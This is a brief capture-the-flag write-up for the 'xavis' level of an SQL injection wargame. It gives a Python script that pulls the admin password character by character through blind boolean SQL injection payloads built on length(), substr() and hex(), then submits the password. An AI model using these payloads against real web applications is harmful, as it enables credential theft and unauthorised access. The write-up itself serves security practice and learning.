url : https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php

# Summary
- We have to get ADMIN PW

# PoC
```python
import requests
import string

header = {"Cookie": "PHPSESSID=;"}
url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?pw=' || length(hex(pw))={}%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

pw_len = 24

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        data = "?pw=' || substr(hex(pw),{},1)='{}'%23".format(idx,i)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)

a = chr(int("0x"+pw[:8], 16))
b = chr(int("0x"+pw[8:16], 16))
c = chr(int("0x"+pw[16:], 16))

print("[+] Found pw : " + a+b+c)

data = "?pw="+a+b+c
response = requests.get(url + data, headers=header)
result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")
```

Vamos~